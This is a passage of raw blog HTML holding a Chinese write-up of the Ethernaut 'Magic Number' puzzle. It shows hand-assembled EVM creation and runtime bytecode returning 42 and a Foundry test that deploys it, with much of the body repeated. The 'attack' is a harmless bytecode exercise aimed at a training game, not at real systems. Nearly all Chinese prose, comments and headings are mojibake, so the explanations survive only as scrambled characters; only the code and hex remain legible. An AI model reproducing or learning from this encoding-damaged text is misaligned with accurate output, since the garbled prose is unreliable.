assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯å­—èŠ‚ç é•¿åº¦æ˜¯å¦ä¸º 10</span><br><span class=\"line\">        uint256 size;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            size := extcodesize(solverAddress)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        assertEq(size, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function deploySolver() public returns (address) &#123;</span><br><span class=\"line\">        address solver;</span><br><span class=\"line\">        // æœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç </span><br><span class=\"line\">        bytes memory bytecode = hex&quot;600a600c600039600a6000f3602a60805260206080f3&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // create(v, p, s): éƒ¨ç½²åˆçº¦</span><br><span class=\"line\">            // v: å‘é€çš„ ether å€¼ (0)</span><br><span class=\"line\">            // p: å­—èŠ‚ç åœ¨å†…å­˜ä¸­çš„ä½ç½® (bytecode + 0x20)</span><br><span class=\"line\">            // s: å­—èŠ‚ç çš„é•¿åº¦ (mload(bytecode))</span><br><span class=\"line\">            solver := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return solver;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è®¾è®¡è¿è¡Œæ—¶ä»£ç </strong>: ç²¾å¿ƒè®¾è®¡ä¸€æ®µä¸è¶…è¿‡10å­—èŠ‚çš„ä»£ç ï¼Œä½¿å…¶èƒ½å¤Ÿè¿”å› <code>42</code>ã€‚</li>\n<li><strong>è®¾è®¡åˆ›å»ºä»£ç </strong>: è®¾è®¡ä¸€æ®µä»£ç ï¼Œå…¶åŠŸèƒ½æ˜¯è¿”å›ç¬¬ä¸€æ­¥ä¸­è®¾è®¡çš„è¿è¡Œæ—¶ä»£ç ã€‚</li>\n<li><strong>ç»„åˆå­—èŠ‚ç </strong>: å°†åˆ›å»ºä»£ç å’Œè¿è¡Œæ—¶ä»£ç æ‹¼æ¥æˆæœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç ã€‚</li>\n<li><strong>éƒ¨ç½²</strong>: ä½¿ç”¨ <code>create</code> æ“ä½œç ï¼ˆå¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–æˆ–å‘é€è£¸äº¤æ˜“ï¼‰æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ï¼Œå¾—åˆ°æ±‚è§£å™¨åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>æäº¤</strong>: å°†æ±‚è§£å™¨åˆçº¦çš„åœ°å€æäº¤ç»™ <code>Ethernaut</code> å…³å¡ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><p>è¿™ä¸ªå…³å¡æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªEVMç¼–ç¨‹çš„ç»ƒä¹ ã€‚ç„¶è€Œï¼Œå®ƒæ­ç¤ºäº†åœ¨è¿›è¡Œå­—èŠ‚ç çº§åˆ«çš„å®¡è®¡æ—¶éœ€è¦æ³¨æ„çš„äº‹é¡¹ï¼š</p>\n<ul>\n<li><strong>ç†è§£åº•å±‚æ“ä½œ</strong>: ä»…ä»…å®¡è®¡Solidityä»£ç å¯èƒ½ä¸è¶³ä»¥å‘ç°æ‰€æœ‰é—®é¢˜ã€‚å¯¹äºé«˜åº¦ä¼˜åŒ–çš„æˆ–ä½¿ç”¨å†…è”æ±‡ç¼–çš„åˆçº¦ï¼Œå¿…é¡»ç†è§£å…¶ç”Ÿæˆçš„EVMæ“ä½œç çš„å®é™…è¡Œä¸ºã€‚</li>\n<li><strong>è­¦æƒ•ä¸å¯»å¸¸çš„éƒ¨ç½²æ¨¡å¼</strong>: å¦‚æœä¸€ä¸ªåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ä¸æ ‡å‡†ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è£¸ <code>create</code> æˆ– <code>create2</code>ï¼‰ï¼Œéœ€è¦ç‰¹åˆ«å®¡æŸ¥å…¶å­—èŠ‚ç çš„æ¥æºå’ŒåŠŸèƒ½ã€‚</li>\n</ul>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>EVM Opcodes</strong>: EVMçš„æ“ä½œç æ˜¯å…¶æ‰§è¡Œæ‰€æœ‰è®¡ç®—çš„åŸºç¡€ã€‚<code>evm.codes</code> æ˜¯ä¸€ä¸ªæå¥½çš„äº¤äº’å¼å‚è€ƒç½‘ç«™ã€‚</li>\n<li><strong>å†…è”æ±‡ç¼– (<code>assembly</code>)</strong>: Solidityå…è®¸åœ¨ä»£ç ä¸­ç›´æ¥åµŒå…¥æ±‡ç¼–è¯­è¨€ï¼Œæä¾›äº†å¯¹EVMæ›´åº•å±‚çš„æ§åˆ¶ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„é£é™©å’Œå¤æ‚æ€§ã€‚</li>\n<li><strong><code>create</code> æ“ä½œç </strong>: ç”¨äºä»ä»£ç ä¸­éƒ¨ç½²æ–°åˆçº¦ã€‚</li>\n<li><strong><code>extcodesize</code> æ“ä½œç </strong>: ç”¨äºè·å–ä¸€ä¸ªåœ°å€ä¸Šçš„ä»£ç å¤§å°ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦çš„å­—èŠ‚ç åˆ†ä¸º <code>creation code</code> å’Œ <code>runtime code</code>ã€‚</li>\n<li><code>creation code</code> åœ¨éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå…¶è¿”å›å€¼æ˜¯ <code>runtime code</code>ã€‚</li>\n<li><code>runtime code</code> æ˜¯æ°¸ä¹…å­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œå“åº”å¤–éƒ¨è°ƒç”¨ã€‚</li>\n<li>é€šè¿‡ç›´æ¥æ“ä½œEVMæ“ä½œç ï¼Œå¯ä»¥åˆ›å»ºå‡ºéå¸¸ç´§å‡‘å’Œé«˜æ•ˆçš„åˆçº¦ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ‰‹å†™æ±‡ç¼–ï¼Œç»•è¿‡é«˜çº§è¯­è¨€çš„é™åˆ¶ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ä»£ç å¤§å°é™åˆ¶ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä¸èƒ½å¿½è§†å¯¹åº•å±‚å­—èŠ‚ç å’Œæ±‡ç¼–çš„åˆ†æï¼Œç‰¹åˆ«æ˜¯å½“åˆçº¦è¡Œä¸ºä¸å¯»å¸¸æ—¶ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://www.evm.codes/\">EVM Codes - An Interactive Reference</a></li>\n<li><a href=\"https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737\">Deconstructing a Solidity Contract</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/assembly.html\">Solidity Docs: Inline Assembly</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-18-Magic-Number-æ‰‹å†™EVMå­—èŠ‚ç \"><a href=\"#ğŸ¯-Ethernaut-Level-18-Magic-Number-æ‰‹å†™EVMå­—èŠ‚ç \" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç \"></a>ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç </h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/18\">Ethernaut Level 18 - Magic Number</a><br><strong>æ”»å‡»ç±»å‹</strong>: EVMå­—èŠ‚ç ç¼–å†™<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ éœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p>\n<ol>\n<li>å®ƒçš„è¿è¡Œæ—¶å­—èŠ‚ç ï¼ˆ<code>runtime bytecode</code>ï¼‰å¤§å°ä¸èƒ½è¶…è¿‡10ä¸ªå­—èŠ‚ã€‚</li>\n<li>å½“è°ƒç”¨å®ƒçš„ <code>whatIsTheMeaningOfLife()</code> å‡½æ•°æ—¶ï¼Œå¿…é¡»è¿”å› <code>42</code>ã€‚</li>\n</ol>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg\" alt=\"Magic Number Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªæŒ‘æˆ˜å°†æˆ‘ä»¬å¸¦å…¥EVMçš„åº•å±‚ã€‚ä½¿ç”¨Solidityç¼–å†™ä¸€ä¸ªè¿”å›42çš„å‡½æ•°éå¸¸ç®€å•ï¼Œä½†ç¼–è¯‘åçš„å­—èŠ‚ç ä¼šè¿œè¿œè¶…è¿‡10å­—èŠ‚çš„é™åˆ¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†å‡½æ•°è°ƒåº¦å™¨ã€å®‰å…¨æ£€æŸ¥ç­‰å¤§é‡é¢å¤–ä»£ç ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ç¼–è¯‘åå­—èŠ‚ç ä¼šå¾ˆé•¿ï¼Œæ— æ³•é€šè¿‡å…³å¡</span><br><span class=\"line\">contract NormalSolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() public pure returns (uint256) &#123;</span><br><span class=\"line\">        return 42;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ç¼–å†™EVMå­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦åˆ†åˆ«æ„å»ºä¸¤éƒ¨åˆ†ä»£ç ï¼š</p>\n<ol>\n<li><strong>è¿è¡Œæ—¶ä»£ç  (Runtime Code)</strong>: è¿™æ˜¯æœ€ç»ˆå­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œè´Ÿè´£åœ¨è¢«è°ƒç”¨æ—¶è¿”å›42ã€‚è¿™éƒ¨åˆ†ä»£ç çš„é•¿åº¦å¿…é¡»å°äºç­‰äº10å­—èŠ‚ã€‚</li>\n<li><strong>åˆ›å»ºä»£ç  (Creation Code)</strong>: è¿™æ˜¯éƒ¨ç½²åˆçº¦æ—¶æ‰§è¡Œçš„ä»£ç ã€‚å®ƒçš„ä»»åŠ¡åªæœ‰ä¸€ä¸ªï¼šå°†è¿è¡Œæ—¶ä»£ç è¿”å›ï¼Œä»¥ä¾¿EVMå°†å…¶å­˜å‚¨ä¸ºæ–°åˆçº¦çš„ä»£ç ã€‚</li>\n</ol>\n<h3 id=\"1-æ„å»ºè¿è¡Œæ—¶ä»£ç -Runtime-Code\"><a href=\"#1-æ„å»ºè¿è¡Œæ—¶ä»£ç -Runtime-Code\" class=\"headerlink\" title=\"1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)\"></a>1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)</h3><p>æˆ‘ä»¬çš„è¿è¡Œæ—¶ä»£ç éœ€è¦åšä¸¤ä»¶äº‹ï¼š</p>\n<ol>\n<li>å°†æ•°å­— <code>42</code> (åå…­è¿›åˆ¶ä¸º <code>0x2a</code>) æ”¾å…¥å†…å­˜ã€‚</li>\n<li>ä»å†…å­˜ä¸­è¿”å›è¿™ä¸ªæ•°å­—ã€‚</li>\n</ol>\n<p>è¿™éœ€è¦ä»¥ä¸‹æ“ä½œç ï¼ˆOpcodesï¼‰ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">åç§°</th>\n<th align=\"left\">ä½œç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x60</code></td>\n<td align=\"left\"><code>PUSH1</code></td>\n<td align=\"left\">å°†1ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0x52</code></td>\n<td align=\"left\"><code>MSTORE</code></td>\n<td align=\"left\"><code>MSTORE(p, v)</code>: å°†å€¼ <code>v</code> å­˜å…¥å†…å­˜åœ°å€ <code>p</code>ã€‚</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0xf3</code></td>\n<td align=\"left\"><code>RETURN</code></td>\n<td align=\"left\"><code>RETURN(p, s)</code>: ä»å†…å­˜åœ°å€ <code>p</code> å¼€å§‹ï¼Œè¿”å› <code>s</code> å­—èŠ‚çš„æ•°æ®ã€‚</td>\n</tr>\n</tbody></table>\n<p>æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>\n<ol>\n<li><code>PUSH1 0x2a</code>: å°† <code>42</code> å‹å…¥å †æ ˆã€‚</li>\n<li><code>PUSH1 0x80</code>: å°†å†…å­˜åœ°å€ <code>0x80</code> å‹å…¥å †æ ˆã€‚ï¼ˆ<code>0x80</code> æ˜¯Solidityä¸­è‡ªç”±å†…å­˜æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œä½¿ç”¨å®ƒæ˜¯æƒ¯ä¾‹ï¼‰ã€‚</li>\n<li><code>MSTORE</code>: <code>mstore(0x80, 0x2a)</code>ï¼Œå°† <code>42</code> å­˜å…¥å†…å­˜ã€‚</li>\n<li><code>PUSH1 0x20</code>: å°†è¿”å›å€¼å¤§å° <code>32</code> å­—èŠ‚ï¼ˆä¸€ä¸ª <code>uint256</code>ï¼‰å‹å…¥å †æ ˆã€‚</li>\n<li><code>PUSH1 0x80</code>: å°†è¿”å›çš„å†…å­˜åœ°å€ <code>0x80</code> å‹å…¥å †æ ˆã€‚</li>\n<li><code>RETURN</code>: <code>return(0x80, 0x20)</code>ï¼Œè¿”å›ç»“æœã€‚</li>\n</ol>\n<p>å°†è¿™äº›æ­¥éª¤è½¬æ¢ä¸ºå­—èŠ‚ç ï¼š<br><code>602a</code> <code>6080</code> <code>52</code> <code>6020</code> <code>6080</code> <code>f3</code></p>\n<p>è¿™ä¸ªå­—èŠ‚ç çš„é•¿åº¦æ˜¯10å­—èŠ‚ï¼š<code>0x602a60805260206080f3</code>ã€‚å®Œç¾ç¬¦åˆè¦æ±‚ï¼</p>\n<h3 id=\"2-æ„å»ºåˆ›å»ºä»£ç -Creation-Code\"><a href=\"#2-æ„å»ºåˆ›å»ºä»£ç -Creation-Code\" class=\"headerlink\" title=\"2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)\"></a>2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)</h3><p>åˆ›å»ºä»£ç çš„ä»»åŠ¡æ˜¯å°†ä¸Šé¢çš„10å­—èŠ‚è¿è¡Œæ—¶ä»£ç è¿”å›ç»™EVMã€‚å®ƒéœ€è¦åšä¸¤ä»¶äº‹ï¼š</p>\n<ol>\n<li>å°†è¿è¡Œæ—¶ä»£ç ä»åˆ›å»ºä»£ç çš„æœ«å°¾å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚</li>\n<li>ä»å†…å­˜ä¸­è¿”å›è¿™æ®µè¿è¡Œæ—¶ä»£ç ã€‚</li>\n</ol>\n<p>è¿™éœ€è¦ <code>CODECOPY</code> æ“ä½œç ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">åç§°</th>\n<th align=\"left\">ä½œç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x39</code></td>\n<td align=\"left\"><code>CODECOPY</code></td>\n<td align=\"left\"><code>CODECOPY(d, p, s)</code>: ä»ä»£ç çš„ <code>p</code> ä½ç½®å¼€å§‹ï¼Œå¤åˆ¶ <code>s</code> å­—èŠ‚åˆ°å†…å­˜çš„ <code>d</code> ä½ç½®ã€‚</td>\n</tr>\n</tbody></table>\n<p>æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>å°†è¿è¡Œæ—¶ä»£ç å¤åˆ¶åˆ°å†…å­˜ <code>0x00</code> å¤„ã€‚</li>\n<li>ä»å†…å­˜ <code>0x00</code> å¤„è¿”å›10å­—èŠ‚çš„ä»£ç ã€‚</li>\n</ol>\n<p>å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>\n<ul>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (è¿è¡Œæ—¶ä»£ç é•¿åº¦: 10å­—èŠ‚)</li>\n<li><code>600c</code>: <code>PUSH1 0x0c</code> (è¿è¡Œæ—¶ä»£ç åœ¨åˆ›å»ºä»£ç ä¸­çš„èµ·å§‹ä½ç½®: ç¬¬12å­—èŠ‚)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (ç›®æ ‡å†…å­˜åœ°å€: 0)</li>\n<li><code>39</code>: <code>CODECOPY</code></li>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (è¦è¿”å›çš„æ•°æ®é•¿åº¦: 10å­—èŠ‚)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (è¦è¿”å›çš„å†…å­˜åœ°å€: 0)</li>\n<li><code>f3</code>: <code>RETURN</code></li>\n</ul>\n<p>åˆ›å»ºä»£ç ä¸º: <code>0x600a600c600039600a6000f3</code>ã€‚å®ƒçš„é•¿åº¦æ˜¯12å­—èŠ‚ã€‚</p>\n<h3 id=\"3-ç»„åˆæœ€ç»ˆå­—èŠ‚ç \"><a href=\"#3-ç»„åˆæœ€ç»ˆå­—èŠ‚ç \" class=\"headerlink\" title=\"3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç \"></a>3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç </h3><p>æœ€ç»ˆéƒ¨ç½²çš„å­—èŠ‚ç æ˜¯ <strong>åˆ›å»ºä»£ç  + è¿è¡Œæ—¶ä»£ç </strong>ï¼š<br><code>0x600a600c600039600a6000f3</code> + <code>602a60805260206080f3</code></p>\n<p>æœ€ç»ˆå­—èŠ‚ç : <code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„å†…è”æ±‡ç¼–å’Œ <code>create</code> æ“ä½œç æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ã€‚</p>\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/18_MagicNumber.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface ISolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() external view returns (uint256);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MagicNumberTest is Test &#123;</span><br><span class=\"line\">    MagicNum instance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">        instance = new MagicNum();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²æˆ‘ä»¬çš„æ‰‹å†™å­—èŠ‚ç åˆçº¦</span><br><span class=\"line\">        address solverAddress = attack.deploySolver();</span><br><span class=\"line\">        instance.setSolver(solverAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯è¿”å›å€¼æ˜¯å¦ä¸º 42</span><br><span class=\"line\">        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯å­—èŠ‚ç é•¿åº¦æ˜¯å¦ä¸º 10</span><br><span class=\"line\">        uint256 size;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            size := extcodesize(solverAddress)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        assertEq(size, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function deploySolver() public returns (address) &#123;</span><br><span class=\"line\">        address solver;</span><br><span class=\"line\">        // æœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç </span><br><span class=\"line\">        bytes memory bytecode = hex&quot;600a600c600039600a6000f3602a60805260206080f3&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // create(v, p, s): éƒ¨ç½²åˆçº¦</span><br><span class=\"line\">            // v: å‘é€çš„ ether å€¼ (0)</span><br><span class=\"line\">            // p: å­—èŠ‚ç åœ¨å†…å­˜ä¸­çš„ä½ç½® (bytecode + 0x20)</span><br><span class=\"line\">            // s: å­—èŠ‚ç çš„é•¿åº¦ (mload(bytecode))</span><br><span class=\"line\">            solver := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return solver;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è®¾è®¡è¿è¡Œæ—¶ä»£ç </strong>: ç²¾å¿ƒè®¾è®¡ä¸€æ®µä¸è¶…è¿‡10å­—èŠ‚çš„ä»£ç ï¼Œä½¿å…¶èƒ½å¤Ÿè¿”å› <code>42</code>ã€‚</li>\n<li><strong>è®¾è®¡åˆ›å»ºä»£ç </strong>: è®¾è®¡ä¸€æ®µä»£ç ï¼Œå…¶åŠŸèƒ½æ˜¯è¿”å›ç¬¬ä¸€æ­¥ä¸­è®¾è®¡çš„è¿è¡Œæ—¶ä»£ç ã€‚</li>\n<li><strong>ç»„åˆå­—èŠ‚ç </strong>: å°†åˆ›å»ºä»£ç å’Œè¿è¡Œæ—¶ä»£ç æ‹¼æ¥æˆæœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç ã€‚</li>\n<li><strong>éƒ¨ç½²</strong>: ä½¿ç”¨ <code>create</code> æ“ä½œç ï¼ˆå¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–æˆ–å‘é€è£¸äº¤æ˜“ï¼‰æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ï¼Œå¾—åˆ°æ±‚è§£å™¨åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>æäº¤</strong>: å°†æ±‚è§£å™¨åˆçº¦çš„åœ°å€æäº¤ç»™ <code>Ethernaut</code> å…³å¡ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><p>è¿™ä¸ªå…³å¡æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªEVMç¼–ç¨‹çš„ç»ƒä¹ ã€‚ç„¶è€Œï¼Œå®ƒæ­ç¤ºäº†åœ¨è¿›è¡Œå­—èŠ‚ç çº§åˆ«çš„å®¡è®¡æ—¶éœ€è¦æ³¨æ„çš„äº‹é¡¹ï¼š</p>\n<ul>\n<li><strong>ç†è§£åº•å±‚æ“ä½œ</strong>: ä»…ä»…å®¡è®¡Solidityä»£ç å¯èƒ½ä¸è¶³ä»¥å‘ç°æ‰€æœ‰é—®é¢˜ã€‚å¯¹äºé«˜åº¦ä¼˜åŒ–çš„æˆ–ä½¿ç”¨å†…è”æ±‡ç¼–çš„åˆçº¦ï¼Œå¿…é¡»ç†è§£å…¶ç”Ÿæˆçš„EVMæ“ä½œç çš„å®é™…è¡Œä¸ºã€‚</li>\n<li><strong>è­¦æƒ•ä¸å¯»å¸¸çš„éƒ¨ç½²æ¨¡å¼</strong>: å¦‚æœä¸€ä¸ªåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ä¸æ ‡å‡†ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è£¸ <code>create</code> æˆ– <code>create2</code>ï¼‰ï¼Œéœ€è¦ç‰¹åˆ«å®¡æŸ¥å…¶å­—èŠ‚ç 